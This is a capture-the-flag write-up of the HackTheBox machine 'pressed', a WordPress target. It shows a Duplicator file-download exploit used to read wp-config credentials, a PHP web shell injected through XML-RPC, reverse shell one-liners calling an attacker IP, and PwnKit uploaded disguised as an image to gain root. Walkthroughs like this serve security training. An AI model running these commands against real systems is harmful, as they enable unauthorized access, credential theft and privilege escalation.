---
layout: post
title: "pressed"
date: 2025-10-04 
categories: CPTS Playlist
---
# pressed

# Summary

- wpscan --plugins-detection aggressive to find vulnerable plugins
- duplicator plugin has arbitrary file download vulnerability; downloaded wp-config.php to get admin credential; but OTP required to login to admin dashboard
- xmlrpc plugin also enabled, used python-wordpress-xmlrpc to interact with backend
- uploaded webshell on new page; cannot get reverse shell
- ippsec forward shell to use an interactive shell
- pwnkit exploit was used, used xmlrpc to upload pwnkit binary as image file; bypassed file upload restriction
- execute pwnkit to get root

# Attack Path

First let’s enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/pressed 10.10.11.142

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.9
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: UHC Jan Finals &#8211; New Month, New Boxes
```

Only one port opened, and it’s running wordpress 5.9. Let’s visit the web page:

![image.png]({{ site.baseurl }}/assets/pressed/image.png)

We see the domain pressed.htb, let’s add that to our /etc/hosts and start a wpscan:

```bash
sudo wpscan --url http://pressed.htb -e ap --plugins-detection aggressive
```

We see a function to post comment. Let’s post one and see the effects:

![image.png]({{ site.baseurl }}/assets/pressed/image%201.png)

After sending, we notice that the site is recording our user agent:

![image.png]({{ site.baseurl }}/assets/pressed/image%202.png)

We can see our request from Mozilla, and our wpscan’s request. That’s the user agent field. If we capture our own POST request we can see they are identical:

![image.png]({{ site.baseurl }}/assets/pressed/image%203.png)

Let’s try changing our User agent and see if the change will be reflected on the site:

![image.png]({{ site.baseurl }}/assets/pressed/image%204.png)

Tip: remember to change your comment to something unique, as the site won’t let you repeat the same comment:

![image.png]({{ site.baseurl }}/assets/pressed/image%205.png)

We see our user-agent string reflected on the site. Let’s see if we can use this to achieve RCE. Let’s put PHP code:

```bash
<?php system($_GET['cmd']); ?>
```

![image.png]({{ site.baseurl }}/assets/pressed/image%206.png)

Looks like it was not executed.

At this point, our wpscan has finished scanning as well:

```bash
Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://pressed.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://pressed.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://pressed.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://pressed.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.9 identified (Insecure, released on 2022-01-25).
 | Found By: Rss Generator (Passive Detection)
 |  - http://pressed.htb/index.php/feed/, <generator>https://wordpress.org/?v=5.9</generator>
 |  - http://pressed.htb/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.9</generator>

[+] WordPress theme in use: retrogeek
 | Location: http://pressed.htb/wp-content/themes/retrogeek/
 | Last Updated: 2024-04-26T00:00:00.000Z
 | Readme: http://pressed.htb/wp-content/themes/retrogeek/README.txt
 | [!] The version is out of date, the latest version is 0.7
 | Style URL: http://pressed.htb/wp-content/themes/retrogeek/style.css?ver=42
 | Style Name: RetroGeek
 | Style URI: https://tuxlog.de/retrogeek/
 | Description: A lightweight, minimal, fast and geeky retro theme remembering the good old terminal times...
 | Author: tuxlog
 | Author URI: https://tuxlog.de/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 0.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://pressed.htb/wp-content/themes/retrogeek/style.css?ver=42, Match: 'Version: 0.5'

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:12:14 <=========================================================> (113372 / 113372) 100.00% Time: 00:12:14
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://pressed.htb/wp-content/plugins/akismet/
 | Last Updated: 2025-07-15T18:17:00.000Z
 | Readme: http://pressed.htb/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.5
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://pressed.htb/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.2.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://pressed.htb/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://pressed.htb/wp-content/plugins/akismet/readme.txt

[+] duplicator
 | Location: http://pressed.htb/wp-content/plugins/duplicator/
 | Last Updated: 2025-09-12T16:17:00.000Z
 | Readme: http://pressed.htb/wp-content/plugins/duplicator/readme.txt
 | [!] The version is out of date, the latest version is 1.5.13.3
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://pressed.htb/wp-content/plugins/duplicator/, status: 200
 |
 | Version: 1.3.26 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://pressed.htb/wp-content/plugins/duplicator/readme.txt

[+] miniorange-2-factor-authentication
 | Location: http://pressed.htb/wp-content/plugins/miniorange-2-factor-authentication/
 | Last Updated: 2025-09-26T11:59:00.000Z
 | Readme: http://pressed.htb/wp-content/plugins/miniorange-2-factor-authentication/readme.txt
 | [!] The version is out of date, the latest version is 6.1.4
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://pressed.htb/wp-content/plugins/miniorange-2-factor-authentication/, status: 200
 |
 | Version: 5.4.51 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://pressed.htb/wp-content/plugins/miniorange-2-factor-authentication/readme.txt

[+] php-everywhere
 | Location: http://pressed.htb/wp-content/plugins/php-everywhere/
 | Latest Version: 3.0.0 (up to date)
 | Last Updated: 2022-01-10T23:05:00.000Z
 | Readme: http://pressed.htb/wp-content/plugins/php-everywhere/readme.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://pressed.htb/wp-content/plugins/php-everywhere/, status: 200
 |
 | Version: 3.0.0 (50% confidence)
 | Found By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://pressed.htb/wp-content/plugins/php-everywhere/readme.txt

[+] relative-url
 | Location: http://pressed.htb/wp-content/plugins/relative-url/
 | Latest Version: 0.1.8 (up to date)
 | Last Updated: 2021-08-11T18:45:00.000Z
 | Readme: http://pressed.htb/wp-content/plugins/relative-url/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://pressed.htb/wp-content/plugins/relative-url/, status: 200
 |
 | Version: 0.1.8 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://pressed.htb/wp-content/plugins/relative-url/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://pressed.htb/wp-content/plugins/relative-url/readme.txt

```

We see the duplicator is version 1.3.26. Searching that up, we find an arbitrary file download exploit:

https://www.exploit-db.com/exploits/50420

Let’s see if this works.

```bash
python3 exploit.py http://pressed.htb /etc/passwd
```

![image.png]({{ site.baseurl }}/assets/pressed/image%207.png)

It worked.

Searching for users with shell:

```bash
cat passwd | grep /bash
root:x:0:0:root:/root:/bin/bash
htb:x:1000:1000:htb:/home/htb:/bin/bash

```

There is a user htb. Now we can try and guess the page name and try and download the source code for the site:

```bash
python3 exploit.py http://pressed.htb /var/www/html/index.php

<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';

```

Let’s see if there is a wp-config file:

```bash
python3 exploit.py http://pressed.htb /var/www/html/wp-config.php

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'admin' );

/** Database password */
define( 'DB_PASSWORD', 'uhc-jan-finals-2022' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

```

Let’s see if there’s a wp-admin page where we can login:

![image.png]({{ site.baseurl }}/assets/pressed/image%208.png)

![image.png]({{ site.baseurl }}/assets/pressed/image%209.png)

Looks like there’s two factor authentication. 

We recall from the wpscan, there is a 2-factor-authentication plugin being implemented as well. Let’s see if there are any vulnerabilities associated with miniorange-2-factor-authentication.

In the readme.html, we see a changelog and get the version of the plugin:

```bash
5.4.51
```

We don’t see anything too useful. 

Let’s look for another vulnerability. In our wpscan output, we also find XMLRPC is enabled. It is a feature that allows us to interact with wordpress remotely, since we have admin credentials, we should be able to use that feature. We can find the documentation here https://codex.wordpress.org/XML-RPC/system.listMethods

Let’s try a simple list method to see if it works:

```bash
curl --data "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" http://pressed.htb/xmlrpc.php
```

![image.png]({{ site.baseurl }}/assets/pressed/image%2010.png)

It works, and we also get a method get_flag, which tells us we are on the right path of exploitation. We can call the .get_flag method:

```bash
curl --data "<methodCall><methodName>htb.get_flag</methodName><params></params></methodCall>" http://pressed.htb/xmlrpc.php
```

Let’s try the wp.newPost method now:

```bash
curl --data "<methodCall><methodName>wp.newPost</methodName><params></params></methodCall>" http://pressed.htb/xmlrpc.php

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>400</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string>Insufficient arguments passed to this XML-RPC method.</string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>

```

We get an error. From the documentation https://codex.wordpress.org/XML-RPC_WordPress_API/Posts#wp.newPost it seems we have to supply it with parameters. Let’s use python-wordpress=xmlrpc https://python-wordpress-xmlrpc.readthedocs.io/en/latest/overview.html for ease of interactions. First download it:

```bash
python3 -m venv myenv
source myenv/bin/activate

pip3 install python-wordpress-xmlrpc
```

Now let’s interact with it, since it’s an older version of python, we have to restore old attributes:

```bash
python

# monkey_patch_collections.py
import collections
import collections.abc as _abc

# restore names removed in Python 3.10+
if not hasattr(collections, "Iterable"):
    collections.Iterable = _abc.Iterable
if not hasattr(collections, "Mapping"):
    collections.Mapping = _abc.Mapping
if not hasattr(collections, "MutableMapping"):
    collections.MutableMapping = _abc.MutableMapping

# now import and use the library
from wordpress_xmlrpc import Client
from wordpress_xmlrpc.methods import posts

client = Client('http://pressed.htb/xmlrpc.php', 'admin', 'uhc-jan-finals-2022')
plist = client.call(posts.GetPosts())
plist

```

![image.png]({{ site.baseurl }}/assets/pressed/image%2011.png)

It’s working. Now let’s see what we can list form the WordPress object:

```bash
dir(plist[0])

['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__firstlineno__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__static_attributes__', '__str__', '__subclasshook__', '__weakref__', '_def', 'comment_status', 'content', 'custom_fields', 'date', 'date_modified', 'definition', 'excerpt', 'guid', 'id', 'link', 'menu_order', 'mime_type', 'parent_id', 'password', 'ping_status', 'post_format', 'post_status', 'post_type', 'slug', 'sticky', 'struct', 'terms', 'thumbnail', 'title', 'user']
```

We see that we can get user, password etc.:

```bash
>>> plist[0].user
'1'
>>> plist[0].password
''
>>> plist[0].link
'/index.php/2022/01/28/hello-world/'
>>> plist[0].content
'<!-- wp:paragraph -->\n<p>The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:php-everywhere-block/php {"code":"JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=","version":"3.0.0"} /-->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->'

```

We see the php-everwhere implementation, and the code is base64 encoded. Let’s decode that on cyber chef and see what it’s actually doing; we also had to URL decode after:

![image.png]({{ site.baseurl }}/assets/pressed/image%2012.png)

If we get the output.log from the previous exploit:

```bash
python3 exploit.py http://pressed.htb /var/www/html/output.log
```

We see it matches with the output on the site:

![image.png]({{ site.baseurl }}/assets/pressed/image%2013.png)

Let’s try to inject a web shell. First we have to URL encode it, then base64 encode it. Let’s add our php code right after the original command:

```bash
<?php  echo(file_get_contents('/var/www/html/output.log')); system($_GET['cmd']); ?>
```

Now encode our code and edit the post:

![image.png]({{ site.baseurl }}/assets/pressed/image%2014.png)

```bash
JTNDP3BocCUyMCUyMGVjaG8oZmlsZV9nZXRfY29udGVudHMoJy92YXIvd3d3L2h0bWwvb3V0cHV0LmxvZycpKTslMjBzeXN0ZW0oJF9HRVQlNUInY21kJyU1RCk7JTIwPyUzRQ==
```

```bash
>>> mod_post = plist[0]
>>> mod_post.content = '<!-- wp:paragraph -->\n<p>The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:php-everywhere-block/php {"code":"JTNDP3BocCUyMCUyMGVjaG8oZmlsZV9nZXRfY29udGVudHMoJy92YXIvd3d3L2h0bWwvb3V0cHV0LmxvZycpKTslMjBzeXN0ZW0oJF9HRVQlNUInY21kJyU1RCk7JTIwPyUzRQ==","version":"3.0.0"} /-->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->'
>>> client.call(posts.EditPost(mod_post.id, mod_post))
```

![image.png]({{ site.baseurl }}/assets/pressed/image%2015.png)

Now let’s refresh the main site.

![image.png]({{ site.baseurl }}/assets/pressed/image%2016.png)

Let’s send a command:

```bash
http://pressed.htb/index.php/2022/01/28/hello-world/?cmd=id
```

![image.png]({{ site.baseurl }}/assets/pressed/image%2017.png)

It worked. Now we have a webshell. Let’s turn that into a reverse shell.

```bash
cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.9/4444 0>&1'

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.9 4444>/tmp/f

nc -e /bin/sh 10.10.16.9 4444
```

URL encode this, and send it in burp:

![image.png]({{ site.baseurl }}/assets/pressed/image%2018.png)

None of the commands are working. Let’s try base64 encoding it:

```bash
echo -n "bash -i >& /dev/tcp/10.10.16.9/4444 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45LzQ0NDQgMD4mMQ==

echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45LzQ0NDQgMD4mMQ== | base64 -d | bash

```

Nope, it just hangs forever. There might be some firewall rules.

```bash
ls -la /etc/iptables
```

We can match the Mozilla screen on our burp to auto scroll down to save us time from scrolling down to the output:

![image.png]({{ site.baseurl }}/assets/pressed/image%2019.png)

It’s world readable:

```bash
cat /etc/iptables/rules.v4

# Generated by iptables-save v1.8.4 on Mon Jan 31 23:19:19 2022
*filter
:INPUT DROP [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT DROP [0:0]
-A INPUT -p tcp -m tcp &#8211;dport 80 -j ACCEPT
-A INPUT -p icmp -m icmp &#8211;icmp-type 8 -j ACCEPT
-A INPUT -i lo -j ACCEPT
-A OUTPUT -p icmp -m icmp &#8211;icmp-type 0 -j ACCEPT
-A OUTPUT -p tcp -m state &#8211;state RELATED,ESTABLISHED -j ACCEPT
-A OUTPUT -o lo -j ACCEPT
COMMIT
# Completed on Mon Jan 31 23:19:19 2022
```

| Direction | What’s Allowed | Why |
| --- | --- | --- |
| Incoming | TCP port 80 | Let people reach the web server |
| Incoming | ICMP echo request | Allow pings in |
| Incoming | Loopback | System self-communication |
| Outgoing | ICMP echo reply | Reply to pings |
| Outgoing | Established/related TCP | Respond to requests (like HTTP responses) |
| Outgoing | Loopback | Local communication |
- Everything else = blocked.

Let’s get IPPSEC’s forward shell and modify what’s required: https://github.com/IppSec/forward-shell

First let’s change our webshell to a $_REQUEST, so we can use POST request as well:

```bash
<?php system($_REQUEST["cmd"]); ?>

 echo(file_get_contents('/var/www/html/output.log')); <?php system($_REQUEST["cmd"]); ?>
```

On cyberchef, URL+base64 encode it:

```bash
JTNDP3BocCUyMCUyMGVjaG8oZmlsZV9nZXRfY29udGVudHMoJy92YXIvd3d3L2h0bWwvb3V0cHV0LmxvZycpKTslMjBzeXN0ZW0oJF9SRVFVRVNUJTVCJTIyY21kJTIyJTVEKTslMjA/JTNF
```

```bash
>>> mod_post.content = '<!-- wp:paragraph -->\n<p>The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:php-everywhere-block/php {"code":"JTNDP3BocCUyMCUyMGVjaG8oZmlsZV9nZXRfY29udGVudHMoJy92YXIvd3d3L2h0bWwvb3V0cHV0LmxvZycpKTslMjBzeXN0ZW0oJF9SRVFVRVNUJTVCJTIyY21kJTIyJTVEKTslMjA/JTNF","version":"3.0.0"} /-->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->'
>>> client.call(posts.EditPost(mod_post.id, mod_post))
```

Now try it out on burp to see if POST request works:

![image.png]({{ site.baseurl }}/assets/pressed/image%2020.png)

It does. Now change the following in forward-shell.py:

```bash
#CHANGE THE FOLLOWING TO:
#TO DEBUG, WE ARE ON A DIFFERENT PROXY
def __init__(self, interval=1.3, proxies='http://127.0.0.1:8082')
        self.url = r"http://pressed.htb/index.php/2022/01/28/hello-world/"
 
  def RunRawCmd(self, cmd, timeout=50, proxy="http://127.0.0.1:8082"):
  
  #comment out
#        #headers = {'User-Agent': payload}   
data = {'cmd': payload} 

        try:
            r = requests.post(self.url, data=data, proxies=proxies, timeout=timeout)   
```

However, this gets the whole HTML index.php page, which breaks the forward shell. We have to put our web shell on a completely brand new page. 

```bash
echo -n '<?php system($_REQUEST["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pg==

echo PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pg== | base64 -d > shell.php
```

```bash
#First check we are in the right dir
cmd=pwd

#RESPONSE
/var/www/html
```

Now let’s execute it:

![image.png]({{ site.baseurl }}/assets/pressed/image%2021.png)

We see our shell.php:

![image.png]({{ site.baseurl }}/assets/pressed/image%2022.png)

Let’s navigate to it and try:

```bash
http://pressed.htb/shell.php?cmd=id
```

![image.png]({{ site.baseurl }}/assets/pressed/image%2023.png)

It works. Now let’s try the forward shell, to change in forward-shell.py:

```bash
#CHANGE THE FOLLOWING TO:
#TO DEBUG, WE ARE ON A DIFFERENT PROXY
def __init__(self, interval=1.3, proxies='http://127.0.0.1:8082')
        self.url = r"http://pressed.htb/shell.php"
 
  def RunRawCmd(self, cmd, timeout=50, proxy="http://127.0.0.1:8082"):
  
  #comment out
#        #headers = {'User-Agent': payload}   
data = {'cmd': payload} 

        try:
            r = requests.post(self.url, data=data, proxies=proxies, timeout=timeout)   
```

Let’s execute:

```bash
python3 forward-shell.py
```

![image.png]({{ site.baseurl }}/assets/pressed/image%2024.png)

We now have a forward shell.

The year this challenge came out, there is a pwnkit exploit. Let’s try and use this one; just download the binary:

[https://github.com/ly4k/PwnKit](https://github.com/ly4k/PwnKit)

Since this is a relatively large file to just upload it via base64, let’s use xmlrpc method to upload. 

```bash
import collections
import collections.abc as _abc

# now import and use the library
from wordpress_xmlrpc import Client
from wordpress_xmlrpc.methods import posts

client = Client('http://pressed.htb/xmlrpc.php', 'admin', 'uhc-jan-finals-2022')
plist = client.call(posts.GetPosts())

#####THE CODE ABOVE IS TO REMIND US WHAT WE HAVE DONE SO FAR

import xmlrpc.client
with open("PwnKit", "rb") as f:
	script = xmlrpc.client.Binary(f.read())
	

	
data = { 'name': 'pwnkit', 'bits': script, 'type': 'text/plain' }
client.call(media.UploadFile(data))
```

Response:

```bash
  File "/usr/lib/python3.13/xmlrpc/client.py", line 642, in close
    raise Fault(**self._stack[0])
xmlrpc.client.Fault: <Fault 500: 'Could not write file pwnkit (Sorry, you are not allowed to upload this file type.).'>

```

Let’s try uploading as an image type:

```bash
data = { 'name': 'pwnkit.png', 'bits': script, 'type': 'text/plain' }
client.call(media.UploadFile(data))
```

response:

```bash
{'attachment_id': '49', 'date_created_gmt': <DateTime '20251004T14:47:45' at 0x7f3f2afb98d0>, 'parent': 0, 'link': '/wp-content/uploads/2025/10/pwnkit.png', 'title': 'pwnkit.png', 'caption': '', 'description': '', 'metadata': False, 'type': 'text/plain', 'thumbnail': '/wp-content/uploads/2025/10/pwnkit.png', 'id': '49', 'file': 'pwnkit.png', 'url': '/wp-content/uploads/2025/10/pwnkit.png'}

```

Now let’s check verify the file intergrity:

```bash
cd /var/www/html/wp-content/uploads/2025/10/

md5sum pwnkit.png
```

![image.png]({{ site.baseurl }}/assets/pressed/image%2025.png)

Now let’s execute our exploit:

```bash
chmod +x pwnkit.png

./pwnkit.png
```

![image.png]({{ site.baseurl }}/assets/pressed/image%2026.png)

We are now root.